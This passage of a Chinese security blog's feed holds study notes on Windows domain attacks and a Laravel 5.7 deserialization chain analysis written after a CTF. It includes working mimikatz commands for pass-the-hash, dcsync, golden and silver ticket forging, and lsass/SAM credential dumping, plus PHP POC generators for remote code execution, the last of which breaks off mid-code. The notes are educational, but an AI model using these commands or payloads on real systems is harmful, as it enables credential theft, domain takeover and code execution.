<li>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内</li>
<li>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机</li>
</ul>
<p><strong>简单来说，DNS名称服务器请求失败时，就会通过链路本地多播名称解析（LLMNR）以及Net-BIOS名称服务，试图在本地进行名称解析</strong></p>
<p>NBT-NS（Netbios Name Service）：</p>
<ul>
<li>与上述基本相同</li>
</ul>
<p><strong>二者区别</strong>：</p>
<ul>
<li>NetBIOS基于广播，而LLMNR基于多播</li>
<li>NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有WindowsVista和更高版本才支持LLMNR</li>
<li>LLMNR还支持IPv6，而NetBIOS不支持，因此，在启用了IPv6，但对IPv6管理不如IPv4那样细致的复杂网络中，就可能发生更广泛的攻击</li>
</ul>
<h6 id="挑战认证相关">挑战认证相关</h6>
<p>SSPI（Security Service Provider Interface）：</p>
<p>​	这是Windows定义的一套接口，定义了安全有关的函数功能，包括但是不限于</p>
<ul>
<li>身份认证机制</li>
<li>为其他协议提供的Session security机制</li>
<li>...</li>
</ul>
<p>SSP（Security Service Provider）：</p>
<p>​	SSPI的实现者，微软实现了以下的SSP</p>
<ul>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>...</li>
</ul>
<h5 id="从理论上理解">从理论上理解</h5>
<p>使用工具 <code>Responder</code>，在内网环境下，假设用户访问一个不存在的UNC路径，则最后会在局域网内发送LLMNR（或者NBNS？）请求，<code>Responder</code> 的作用就是回复这些请求，那么用户和攻击机（即<code>Responder</code>所在机器）发起质询和响应，可以截获到NLTMv2 SSP。</p>
<p>在本机测试后，即使弹出了登录框，输入密码后还是NTLMv2 SSP，因为是NTLM认证呀...可能和设置有关吧（其他文章里直接获取了明文密码），埋一个坑，后续再看。</p>
<h6 id="缺点">缺点</h6>
<ol>
<li>感觉触发的概率不是很大</li>
<li>跑的不是NTLM Hash，是NTLM-v1/v2 Hash，只能通过本地用Hashcat跑，比硬件</li>
</ol>
<h5 id="参考文章">参考文章</h5>
<p><a href="https://blog.csdn.net/wxh0000mm/article/details/105997105">发起NTLM</a></p>
<ul>
<li>Outlook ：<code>&lt;img src=&quot;\\172.16.100.1\outlook&quot;&gt;</code></li>
<li>OFFICE ：钓鱼可用</li>
<li>Mysql：load_file同样支持unc</li>
</ul>
<h3 id="kerberos系列">Kerberos系列</h3>
<h4 id="ms14-068">MS14-068</h4>
<p>首先补丁为<code>kb3011780</code><br>
原理：用户在向KDC申请TGT的时候，申明自己有域管理员权限，而KDC没有校验该票据的签名，导致权限提升。-&gt;从&lt;&lt;内网安全攻防&gt;&gt;摘录<br>
但是思考了以下觉得不对啊，看Kerberos认证里，第一步的时候如果申请了，AS会校验用户hash。查阅其他人的文章，找到如下：<br>
Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>
那么发现了，其实申请TGT是第二部，书里也写了，只是我没看到...</p>
<h3 id="token系列">Token系列</h3>
<p>分类：</p>
<ul>
<li>Delegation Tokens授权令牌</li>
<li>Impersonation Tokens模拟令牌</li>
</ul>
<p><code>注：用户注销后会切换至模拟令牌，不会注销</code></p>
<p>我认为这个是本地登录过administrator的情况才有？</p>
<p>常见的<code>msf</code>操作：</p>
<ul>
<li><code>load incognito</code></li>
<li><code>list_tokens -u</code></li>
<li><code>impoersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>（这里为上述列举出的token，如果存在就直接提权成功）</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(二)-PTH&PTT]]></title>
        <id>https://chriskalix.github.io/post/hPs3dwq1p/</id>
        <link href="https://chriskalix.github.io/post/hPs3dwq1p/">
        </link>
        <updated>2020-06-26T08:16:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="pth">PTH</h2>
<blockquote>
<p>内网中，经常需要抓取管理员密码(NTLM Hash)。PTH是一种不需要账户明文密码就能完成认证的一个技术。尤其是在域环境下，能帮助我们扩大战果</p>
</blockquote>
<h3 id="必须条件">必须条件</h3>
<ol>
<li>网络互达(这个有点多余，不互达怎么做)</li>
<li>需要用户名</li>
<li>需要NTLM Hash</li>
</ol>
<p>问题1：为什么需要用户名？<br>
答案：看一下NTLM协议，第一步就是传输用户名</p>
<p>问题2：如何使用NTLMv1/NTLMv2或者net NTLM进行HASH传递攻击？<br>
答案：这些都不行，只有NTLM Hash</p>
<h3 id="通常pth的渗透方式">通常PTH的渗透方式</h3>
<ul>
<li>获取一台域内主机的权限</li>
<li>Dump内存获取用户HASH</li>
<li>通过PTH尝试登录其他主机</li>
<li>继续收集HASH并尝试远程登录</li>
<li>直到获取域管理员HASH，最终成果控制整个域</li>
</ul>
<h3 id="现实情况">现实情况</h3>
<blockquote>
<p>会有补丁，策略等等，以下列出两种</p>
</blockquote>
<h4 id="对抗补丁">对抗补丁</h4>
<p>KB2871997（被称为PTH杀手），是微软在2014年5月13号推出的补丁，当时的标题为&quot;Update to fix the Pass-The-Hash Vulnerability&quot;，一周后改为&quot;Update to improve credentials protection and management&quot;<br>
使得本地账号不能再用于远程接入系统，这样就无法以本地管理员用户执行wmi、PSEXEC、schtasks、at和文件访问。然而，administrator用户仍能够PTH，这里是SID为500的用户，默认名为administrator，即使改名了，SID还是不会改变<br>
所以从防御视角来说，即使打了补丁，还要禁用SID=500的管理员用户</p>
<h4 id="laps">LAPS</h4>
<p>LAPS即Local Administrator Password Solution，是微软推出的本地密码管理方案。解决了域内主机本地管理员密码相同的问题。</p>
<h3 id="操作命令">操作命令</h3>
<blockquote>
<p>这里其实本地搭建一个域环境会理解的比较深刻，我之前搭建了，系统重装后忘记保存，暂时没有</p>
</blockquote>
<h4 id="使用ntlm-hash进行pth攻击">使用NTLM Hash进行PTH攻击</h4>
<blockquote>
<p>此方法在KB2871997后收到限制，只能用SID=500的账户进行PTH操作</p>
</blockquote>
<p><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /ntlm:xxxxx</code></p>
<h4 id="aes-256进行pth攻击ptk">AES-256进行PTH攻击(PTK)</h4>
<blockquote>
<p>此方法针对的是打上了KB2871997的机器（猜测就是为啥微软一周后就改名了），又叫<code>Pass The Key</code></p>
</blockquote>
<ol>
<li>mimikatz抓取AES-256密钥<br>
<code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></li>
<li><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /aes256:xxxxx</code></li>
</ol>
<h3 id="pth的其他场景">PTH的其他场景</h3>
<p>在<a href="https://www.secpulse.com/archives/105503.html">这篇文章</a>中我看到了其他场景。Restricted Admin Mode，开启这个模式后，默认可以用凭证登录</p>
<p><code>privilege::debug sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</code></p>
<h2 id="ptt">PTT</h2>
<blockquote>
<p>PTT，Pass The Ticket即票据传递攻击。<br>
cs中<br>
<code>kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话</code></p>
</blockquote>
<h3 id="golden-ticket黄金票据">Golden Ticket黄金票据</h3>
<blockquote>
<p>该票据的利用条件是原先已成功取得域用户(krbtgt)的HASH这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
</blockquote>
<p>相当于可以自己造TGT</p>
<h4 id="前提条件">前提条件</h4>
<ul>
<li>域名称</li>
<li>域SID</li>
<li>域krbtgt的hash（意味着你已经有域控权限）</li>
<li>伪造的用户名（任意用户或者不存在的用户）</li>
</ul>
<h4 id="具体操作">具体操作</h4>
<ol>
<li>
<p>提取域用户kgbtgt的NTLM Hash<br>
<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code>或者上个文章提到的方法</p>
</li>
<li>
<p>查看域内所有用户的hash<br>
<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></p>
</li>
<li>
<p>获取域SID<br>
<code>whoami /all</code></p>
</li>
<li>
<p>生成票据<br>
方法1： AES256</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p>方法2：NTLM Hash</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></p>
</li>
</ol>
<h4 id="防御">防御</h4>
<ol>
<li>经常更换KRBTGT密码</li>
<li>不允许域管账户登录其他服务器</li>
</ol>
<h3 id="silver-ticket白银票据">Silver Ticket白银票据</h3>
<blockquote>
<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信</p>
</blockquote>
<h4 id="前提条件-2">前提条件</h4>
<ul>
<li>域名称</li>
<li>域的SID</li>
<li>域中Server服务器账户的NTLM-Hash</li>
<li>伪造任意的用户名</li>
</ul>
<h4 id="具体操作-2">具体操作</h4>
<ol>
<li>导出hash<br>
<code>mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
<li>生成ticket<br>
<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型} /rc4:{NTLM Hash} /user:{用户名} /ptt&quot; exit Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大</code></li>
</ol>
<h4 id="防御-2">防御</h4>
<p>PAC</p>
<h2 id="参考文章">参考文章</h2>
<p><a href="http://www.vuln.cn/6813">乌云文章</a><br>
<a href="https://xz.aliyun.com/t/7051">先知文章</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(一)-Windows认证]]></title>
        <id>https://chriskalix.github.io/post/e3nr4E66U/</id>
        <link href="https://chriskalix.github.io/post/e3nr4E66U/">
        </link>
        <updated>2020-06-26T08:14:38.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>主要包含本地认证，网络认证，域认证</p>
</blockquote>
<h2 id="windows本地认证">Windows本地认证</h2>
<p>简述流程：当登录系统时候，用户的密码会被加密成NTLM Hash，再通过与SAM数据库中用户的哈希（<code>%SystemRoot%\system32\config\sam</code>）进行匹配从而完成校验。</p>
<h3 id="认证流程">认证流程</h3>
<p>简易图：<br>
<img src="https://chriskalix.github.io/post-images/1593159324969.png" alt="" loading="lazy"></p>
<p>提到的<strong>NTLM Hash</strong>，是一种单向哈希算法。顺便记一下，Windows中不以明文形式进行传输和存储。算法的流程如下：</p>
<p><code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
<p>简单地用py做个HASH：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593159333529.png" alt="" loading="lazy"></figure>
<blockquote>
<p><code>NTLM Hash</code>的前身为<code>LM Hash</code>，存在于<code>Windows Server 2008</code>之前版本，由于安全性被淘汰</p>
</blockquote>
<p>经常我们听到用mimikatz抓密码这个操作，其实就是从<code>lsass.exe</code>这个进程中读取到的</p>
<h3 id="抓取密码">抓取密码</h3>
<blockquote>
<p>这一过程需要system，毕竟访问的是<code>lsass.exe</code></p>
</blockquote>
<h4 id="用procdump-mimikatz">用Procdump + Mimikatz</h4>
<p>mimikatz都听过，但是不做免杀就是冲锋兵，没落地就被吃了。那怎么办，可以用微软自带的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>，命令如下：<br>
<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code><br>
然后再脱到本地，用<code>mimikatz</code>跑一下<br>
<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
<h4 id="无工具直接抓取">无工具直接抓取</h4>
<p>直接通过reg的save选项保存<br>
<code>reg save hklm\sam sam.hive</code><br>
<code>reg save hklm\system system.hive</code></p>
<p>然后拖到本地，mimikatz跑<br>
<code>lsadump::sam /sam:sam.hive /system:system.hive</code></p>
<p>问题：为什么有时候看到能抓明文，有时候又是抓NTLM Hash？</p>
<p>答案：默认Win10或者win server 2012r2以上的，禁止在内存中保存明文密码(WDigest策略)，所以有时候需要明文密码的时候，就需要Hook winlogon程序，然后开启WDigest等待对方登录。</p>
<h2 id="windows网络认证">Windows网络认证</h2>
<p>工作组环境下远程登录另外一台设备所采用的认证机制。常见的如SMB</p>
<h3 id="ntlm协议">NTLM协议</h3>
<p>分为三步骤</p>
<ol>
<li>协商</li>
<li>质询</li>
<li>验证</li>
</ol>
<h4 id="1-协商">1. 协商</h4>
<p>协商认证版本（NTLM v1/NTLM v2）</p>
<h4 id="2-质询">2. <strong>质询</strong></h4>
<p>**挑战（Chalenge）/响应（Response）**认证机制。步骤如下：</p>
<ol>
<li>客户端向服务端发送用户信息（用户名）请求</li>
<li>服务端接受到请求，生成一个16位的随机数，成为&quot;Challenge&quot;，服务端查询用户名所对应的NTLM Hash，用该哈希加密&quot;Challeng&quot;，保存至内存中，称之为&quot;Challeng1&quot;，之后再将&quot;Challenge&quot;发送至客户端</li>
<li>客户端收到&quot;Chanlleng&quot;后，同样的使用自己的NTLM Hash，对&quot;Challenge&quot;进行加密比对，生成Response传递给客户端</li>
</ol>
<p>其中NTLM Hash加密Challenge的结果，在协议中称为Net NTLM Hash</p>
<h4 id="3-验证">3. 验证</h4>
<p>客户端收到上述的Response，与内存中的Chanllenge1进行比对，完成验证</p>
<h2 id="域认证kerberos">域认证（Kerberos）</h2>
<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
<p>域认证所包含的角色有：</p>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Centor) = DC</li>
</ul>
<h3 id="详细流程">详细流程</h3>
<p>流程图如下所示：<br>
<img src="https://chriskalix.github.io/post-images/1593159403049.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Laravel 5.7.x反序列化链分析]]></title>
        <id>https://chriskalix.github.io/post/xpSoAzZun/</id>
        <link href="https://chriskalix.github.io/post/xpSoAzZun/">
        </link>
        <updated>2020-06-26T08:02:56.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>前段时间电脑重装后忘记备份了，从环境开始</p>
</blockquote>
<h2 id="环境预备">环境预备</h2>
<h3 id="准备工具">准备工具</h3>
<ol>
<li>PHPStudy - PHP 7.1.9</li>
<li>composer</li>
<li>VSCODE(调试)</li>
</ol>
<h3 id="安装">安装</h3>
<ol>
<li>设置源 ：<code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></li>
<li>安装Laravel ：<code>composer create-project laravel/laravel Laravel --prefer-dist &quot;5.7.*&quot;</code></li>
</ol>
<h2 id="开始调试">开始调试</h2>
<blockquote>
<p>比赛前没有看过Laravel框架，比赛的时候很慌乱，到处找链，发现入口点都是一样的，但是被堵死了</p>
</blockquote>
<h3 id="laravel-57x反序列化链一">Laravel 5.7.x反序列化链(一)</h3>
<h4 id="设置反序列化入口点">设置反序列化入口点</h4>
<p>先往<code>app/Http/Controllers/</code>下添加<code>TaskController.php</code>文件，内容为</p>
<pre><code class="language-php">&lt;?php
namespace App\Http\Controllers;
class TaskController 
{ 
public function index(){
    if(isset($_GET['p'])){
        unserialize($_GET['p']);    
    } 
    return &quot;There is an param names p (get)&quot;; 
    } 
} 
?&gt;
</code></pre>
<p>在<code>routes/web.php</code>下添加路由</p>
<pre><code class="language-php">Route::get('/index', 'TaskController@index');
</code></pre>
<p>访问<code>localhost/Laravel/public/index</code>，返回<code>There is an param names p (get)</code>证明成功</p>
<h4 id="反序列化入口点">反序列化入口点</h4>
<p>网上能找到的，如<code>CVE-2019-9081</code>，大多反序列的入口点为<code>vendor/laravel/framework/src/illuminate/Foundation/Testing/PendingCommand.php</code>，中的<code>PendingCommand</code>类，提取出相关的函数点，如下：</p>
<pre><code class="language-php">class PendingCommand
{
	public $test;
	protected $app;
	protected $command;
	protected $parameters;
	protected $expectedExitCode;
	protected $hasExecuted = false;
	...
    public function run()
    {
    	...
    }
    ...
    public function __destruct()
    {
        if ($this-&gt;hasExecuted) {
            return;
        }

        $this-&gt;run();
    }
}
</code></pre>
<h4 id="继续跟进">继续跟进</h4>
<p>默认调用了<code>$this-&gt;run()</code>，继续跟进<code>run()</code>下的代码</p>
<pre><code class="language-php">    /**
     * Execute the command.
     *
     * @return int
    */
   public function run()
    {
        $this-&gt;hasExecuted = true;
        $this-&gt;mockConsoleOutput();
        try {
            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
        } catch (NoMatchingExpectationException $e) {
            if ($e-&gt;getMethodName() === 'askQuestion') {
                $this-&gt;test-&gt;fail('Unexpected question &quot;'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'&quot; was asked.');
            }
            throw $e;
        }
        if ($this-&gt;expectedExitCode !== null) {
            $this-&gt;test-&gt;assertEquals(
                $this-&gt;expectedExitCode, $exitCode,
                &quot;Expected status code {$this-&gt;expectedExitCode} but received {$exitCode}.&quot;
            );
        }
        return $exitCode;
    }
</code></pre>
<p>为什么看到<code>run</code>方法比较兴奋，因为上面注释写着<code>execute the command</code>，一看就是有执行的样子。但是先调用了该类的<code>mockConsoleOutput</code>方法，继续跟进查看，这边构造的时候注意<code>$app</code>的类问题，在该文件中有注释<code>* @param \Illuminate\Foundation\Application $app</code>。该类在文件<code>vendor/laravel/framework/src/illuminate/Foundation/Application.php</code>下</p>
<pre><code class="language-php">protected function mockConsoleOutput()
{
    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
        (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),
    ]);

    foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) {
        $mock-&gt;shouldReceive('askQuestion')
            -&gt;once()
            -&gt;ordered()
            -&gt;with(Mockery::on(function ($argument) use ($question) {
                return $argument-&gt;getQuestion() == $question[0];
            }))
            -&gt;andReturnUsing(function () use ($question, $i) {
                unset($this-&gt;test-&gt;expectedQuestions[$i]);

                return $question[1];
            });
    }

    $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {
        return $mock;
    });
}
</code></pre>
<p>看到<code>foreach</code>那行，因为<code>test</code>可控，所以该函数可以调用任意类下的<code>__get</code>。全局搜索，还是有挺多的，网上的文章不同的大部分在这里开支，有使用<code>Illuminate\Auth\GenericUser</code>类的，也有使用<code>Faker\DefaultGenerator</code>类的。这边挑取<code>Faker\DefaultGenerator</code>进行跟进分析</p>
<h4 id="链子1">链子1</h4>
<p>找到文件<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>，如下：</p>
<pre><code class="language-php">class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this-&gt;default = $default;
    }
    public function __get($attribute)
    {
        return $this-&gt;default;
    }
    public function __call($method, $attributes)
    {
        return $this-&gt;default;
    }
}

</code></pre>
<p>跟先知文章走，到这里先自己构造一遍</p>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation {
	class Application {
		public function __construct() {
		}
	}
}

namespace {
	$c = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$b = new Illuminate\Foundation\Application();
	$a = new Illuminate\Foundation\Testing\PendingCommand($c, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>给<code>PendingCommand</code>传的不是array，会报如下错误<br>
<img src="https://chriskalix.github.io/post-images/1593158937485.png" alt="" loading="lazy"></p>
<h4 id="关键函数">关键函数</h4>
<p>继续跟进到</p>
<pre><code class="language-php">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
</code></pre>
<p>这时候需要认真看，因为调到这里的时候报错了。首先先看一下app是什么，在代码里的注释有，如下：</p>
<pre><code class="language-php">/**
 * The application instance.
 *
 * @var \Illuminate\Foundation\Application
 */
protected $app;
</code></pre>
<p>其实就是<code>\Illuminate\Foundation\Application</code>下的类，<code>Kernel::class</code>其实就是字符串<code>Illuminate\Contracts\Console\Kernel</code>，这里讲起来比较绕，直接上图。</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593158913879.png" alt="" loading="lazy"></figure>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances = [];
        public function __construct($instances = [])
        {
            $this-&gt;instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
	$d = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$c = new Illuminate\Foundation\Application();
	$b = new Illuminate\Foundation\Application($c);
	$a = new Illuminate\Foundation\Testing\PendingCommand($d, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>最后POC如上，就是和先知那个文章一样了，照着跟的，不过这个CVE其实有版本限制</p>
<h3 id="laravel反序列化链二">Laravel反序列化链（二）</h3>
<blockquote>
<p>这个链子是群里奶权师傅的0day，链子十分神奇，属实太强了。不是我的不是我的不是我的，是奶权的，是奶权的，是奶权的。</p>
</blockquote>
<h4 id="反序列化入口点-2">反序列化入口点</h4>
<p>入口点文件在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteSteam/TemporaryFileByteStream.php</code>的<code>Swift_ByteStream_TemporaryFileByteStream</code>类</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1593158964510.png" alt="" loading="lazy"></figure>
<p>跟到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php</code>的<code>Swift_ByteStream_FileByteStream</code>下的<code>getpath()</code></p>
<pre><code class="language-php">public function getPath()
{
    return $this-&gt;path;
}
</code></pre>
<p>这里可控，且<code>file_exists</code>所以触发任意类的 <code>__toString()</code></p>
<h4 id="继续跟进-2">继续跟进</h4>
<p><code>vendor/laravel/framework/src/Illuminate/View/View.php</code> 下的<code>__toString()</code></p>
<pre><code class="language-php">public function __toString()
{
    return $this-&gt;render();
}
</code></pre>
<p>跟到<code>render</code>函数</p>
<pre><code class="language-php">public function render(callable $callback = null)
{
    try {
        $contents = $this-&gt;renderContents();

        $response = isset($callback) ? call_user_func($callback, $this, $contents) : null;

        // Once we have the contents of the view, we will flush the sections if we are
        // done rendering all views so that there is nothing left hanging over when
        // another view gets rendered in the future by the application developer.
        $this-&gt;factory-&gt;flushStateIfDoneRendering();

        return ! is_null($response) ? $response : $contents;
    } catch (Exception $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    } catch (Throwable $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    }
}
</code></pre>
<p>虽然<code>try</code>出现了<code>call_user_func</code>，但是<code>$callback</code>是空的，可以看到<code>$this-&gt;factory-&gt;flushStateIfDoneRendering();</code> 是可控的，可以触发任意类 <code>__call()</code>，作为跳板继续跟进。在<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>下</p>
<pre><code class="language-php">public function __call($method, $attributes)
{
    return $this-&gt;format($method, $attributes);
}
</code></pre>
<p>继续跟进</p>
<pre><code class="language-php">public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
}
</code></pre>
<p>这里只有<code>$formatter</code>是可控的，跟进<code>getFormatter</code>，得到如下</p>
<pre><code class="language-php">public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter));
}
</code></pre>
<p><code>getformatter</code>中的<code>return $this-&gt;formatters[$formatter]</code>，因为<code>$formatters</code>与<code>$formatter</code>均可控，所以这里调用任意类的任意方法，但是由于<code>format</code>方法中的<code>$arguements</code>为空，不能对函数进行传参</p>
<h4 id="执行点">执行点</h4>
<blockquote>
<p>这个地方我觉得是最神奇的，我看着poc写分析过程的时候到这有点卡住了。后来看了奶权师傅的分析文章才明白，这个地方确实很神奇</p>
</blockquote>
<p>可用函数点为<code>/vendor/fzaninotto/faker/src/Faker/VaildGenerator.php</code>下的<code>__call</code>函数中，如下：</p>
<pre><code class="language-php">public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}
</code></pre>
<p>首先<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</code>获取<code>$res</code>返回值，然后走到<code>while</code>里的<code>call_user_func</code>进行执行，do while会先进去，再到while分支的，继续寻找能控制返回值的（且不需要输入参数）的函数。</p>
<p>在<code>vendor/phpunit/php-token-stream/src/Token/Stream.php</code> 中找到</p>
<pre><code class="language-php">public function getFilename()
{
    return $this-&gt;filename;
}
</code></pre>
<p>那么到这里利用链就分析完毕，这里写上POC，POC也是看着奶权写的，都是奶哥的，我负责复现5555555</p>
<pre><code class="language-php">&lt;?php
namespace {
    class PHP_Token_Stream {
        protected $filename;
        public function __construct() {
            $this-&gt;filename = &quot;whoami&quot;;
        }
    }
}

namespace Faker {
    use PHP_Token_Stream;
    class ValidGenerator {
        protected $generator;
        protected $validator; // while (!call_user_func($this-&gt;validator, $res));
        protected $maxRetries; // if ($i &gt; $this-&gt;maxRetries)执行一次，所以设定为2就行
        public function __construct() {
            $this-&gt;generator = new PHP_Token_Stream;
            $this-&gt;validator = &quot;system&quot;;
            $this-&gt;maxRetries = 2;
        }
    }
    class Generator {
        protected $formatters = array();
        public function __construct() {
            $this-&gt;formatters['flushState'] = [new ValidGenerator, &quot;getFilename&quot;];
        }
    }
}

namespace Illuminate\View {
    use Faker\Generator;
    class View {
        protected $factory;
        public function __construct() {
            $this-&gt;factory = new Generator;
        }
    }
}

namespace {
    use Illuminate\View\View;
    class Swift_ByteStream_FileByteStream {
        private $path;
        public function __construct() {
            $this-&gt;path = new View;
        }
    }

    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    }

    $a = new Swift_ByteStream_TemporaryFileByteStream;
    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream));
}
</code></pre>
<h4 id="反序列化链三">反序列化链（三）</h4>
<p>这里就不继续分析了，换了一个入口点进入<code>run()</code>，比赛的时候没注意哈哈哈，老老实实地复现跟踪</p>
<pre><code class="language-php">&lt;?php
//gadgets.php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;


        public function __construct($command, $parameters,$class,$app)
{
            $this-&gt;command = $command;
            $this-&gt;parameters = $parameters;
            $this-&gt;test=$class;
            $this-&gt;app=$app;
        }
    }
}


namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this-&gt;attributes = $attributes;
        }
    }
}




namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;


        public function __construct($bind){
            $this-&gt;bindings=$bind;
        }
    }
}


namespace Symfony\Component\Routing\Loader\Configurator{
    class CollectionConfigurator
    {
        public $parent;
        public $collection;
        public $prefixes;


        public function __construct($parent)
{
            $this-&gt;prefixes=1;
            $this-&gt;parent=$parent;
            $this-&gt;collection=new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
        }
    }
}


namespace Faker{
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
